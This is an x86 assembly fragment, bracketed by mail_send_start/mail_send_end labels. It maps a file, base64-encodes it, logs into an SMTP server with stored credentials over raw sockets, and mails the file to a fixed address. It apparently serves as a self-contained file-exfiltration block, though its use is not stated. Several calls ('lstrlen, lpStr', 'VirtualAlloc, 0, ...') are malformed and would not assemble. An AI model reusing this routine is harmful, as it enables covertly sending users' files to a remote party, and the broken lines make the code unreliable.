mail_send_start:

get_data proc
      mov     edi, offset mail_buf0
      mov     ecx, 100h
    get_data_loop:   
      test    ecx, ecx
      je      get_data_err
      push    ecx
      push    ecx
      
      push    0
      push    ecx
      push    edi
      push    ebx
      call    dword ptr [_recv]
      
      pop     ecx
      pop     ecx
      inc     eax
      je      get_data_err
      dec     eax
      add     edi, eax
      sub     ecx, eax
      cmp     byte ptr [edi-1], 10
      je      get_data_ok
    get_data_test:
      test    eax, eax
      jnz     get_data_loop
    get_data_err:
      xor     eax, eax
      jmp     get_data_end
    get_data_ok:
      cmp     byte ptr [mail_buf0], '2'
      jz      get_data_a
      cmp     byte ptr [mail_buf0], '3'
      jnz     get_data_err
    get_data_a:
      inc     eax
      inc     edi
      mov     byte ptr [edi], 0
    get_data_end:    
      ret      
get_data endp   

Send_String proc lpStr:DWORD
      lstrlen, lpStr
      push    0
      push    eax
      push    dword ptr [lpStr]
      push    ebx
      call    dword ptr [_send]
      ret      
Send_String endp   

MAIL_SEND proc
    LOCAL hBase64 :DWORD
    LOCAL hBase64Len :DWORD
    LOCAL pStart: DWORD
    LOCAL pEnd: DWORD
      invoke  MapFile, addr cpyfrom, addr mfile, MAP_FILE_A
      test    eax, eax
      je      mail_map_file_err
      mov     eax, mfile.dwFileSize
      imul    eax, eax, 2
      mov     hBase64Len, eax
      VirtualAlloc, 0, hBase64Len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      mail_bad_alloc_base64
      mov     hBase64, eax
      invoke  Base64Encode, mfile.lpMem, hBase64, mfile.dwFileSize
      
      push    offset cpyfrom
      call    _PathFindFileName
      push    eax
      
      push    eax
      push    eax
      push    offset a1
      push    offset mail_buf
      call    wsprintf
      add     esp, 4*4
      
      pop     eax
      
      push    eax
      push    offset szsubj
      push    offset mail_buf2
      call    wsprintf
      add     esp, 3*4
      
      lea     ebx, [base64log]
      lstrlen, addr mail_login
      invoke  Base64Encode, addr mail_login, ebx, eax
      lea     ebx, [base64pass]
      lstrlen, addr mail_pwd
      invoke  Base64Encode, addr mail_pwd, ebx, eax
      
      push    0
      push    1
      push    2
      call    dword ptr [_socket]
      or      eax, eax
      jz      nosock
      mov     ebx, eax
      
      push    offset mail_server
      call    dword ptr [_gethostbyname]
      test    eax, eax
      jz      cantfinds
      mov     eax, dword ptr [eax+0ch]
      mov     eax, dword ptr [eax]
      mov     eax, dword ptr [eax]
      
      mov     dword ptr [saddr.sin_addr], eax
      
      mov     word  ptr [saddr.sin_family], AF_INET
      mov     ax, word ptr [mail_port]
      xchg    ah, al
      mov     word ptr [saddr.sin_port], ax
      
      push    sizeof sockaddr_in
      push    offset saddr
      push    ebx
      call    dword ptr [_connect]
      test    eax, eax
      jnz     cantconnect
      
      call    get_data
      test    eax, eax
      jz      errrecv
      
      mov     eax, offset szEHLO
      call    sendNrecv
      
      mov     eax, offset szAUTHLOGIN
      call    sendNrecv
      
      lea     eax, [base64log]
      invoke  Send_String, eax
      mov     eax, offset szEnd+3
      call    sendNrecv
      
      lea     eax, [base64pass]
      invoke  Send_String, eax
      mov     eax, offset szEnd+3
      call    sendNrecv
      
      invoke  Send_String, addr szMAILFROM
      invoke  Send_String, addr mail_from
      mov     eax, offset szSKOBKA
      call    sendNrecv
      
      invoke  Send_String, addr szRCPTTO
      invoke  Send_String, addr mail_to
      mov     eax, offset szSKOBKA
      call    sendNrecv
      
      invoke  Send_String, addr szDATA
      invoke  Send_String, addr szSubject
      invoke  Send_String, addr mail_buf2
      invoke  Send_String, addr szEnd+3
      invoke  Send_String, addr mail_buf
      invoke  Send_String, hBase64
      mov     eax, offset szEnd+3
      call    sendNrecv
      
      mov     eax, offset szEnd
      call    sendNrecv
      
      mov     eax, offset szQuit
      call    sendNrecv
      
    closesock: 
      push    ebx
      call    dword ptr [_closesocket]
    nosock:   
      VirtualFree, hBase64, hBase64Len, MEM_DECOMMIT
    mail_bad_alloc_base64:
      invoke  UnmapFile, addr mfile
    mail_map_file_err:
      ret
    cantfinds: 
      jmp     nosock
    cantconnect: 
      jmp     closesock
    errrecv:   
      jmp     closesock
      
    sendNrecv: 
      invoke  Send_String, eax
      
      call    get_data
      test    eax, eax
      pop     ecx
      jz      errrecv
      jmp     ecx
MAIL_SEND endp  

Base64Encode proc uses edi esi ebx lpSource:DWORD, lpDestination:DWORD, InputAmt:DWORD; returns eax = output size
    mov ebx,offset tblBase64
    mov esi,lpSource
    mov edi,lpDestination
    mov edx,InputAmt
start_a_trio:
    mov ah,0
    mov ecx,6
@@: dec edx
    js short @F
    lodsb
    shl ax,cl
    xchg al,ah
    xlat
    stosb
    shr ah,cl
    sub cl,2
    jnz @B
    mov al,ah
    xlat
    stosb
    jmp short start_a_trio
@@:     ;cl is 6/4/2 if input size is 0/1/2 mod 3
    sub cl,4
    js short two_mod_3
    jnz short zero_mod_3
    mov al,0
    shr eax,4
    xlat
    stosb
    mov ax,"=="
    stosw
    jmp short zero_mod_3
two_mod_3:
    mov al,0
    shr eax,6
    xlat
    mov ah,"="
    stosw
zero_mod_3:
    xchg eax,edi
    sub eax,[ebp+12]
    ret
Base64Encode endp
      
mail_send_end: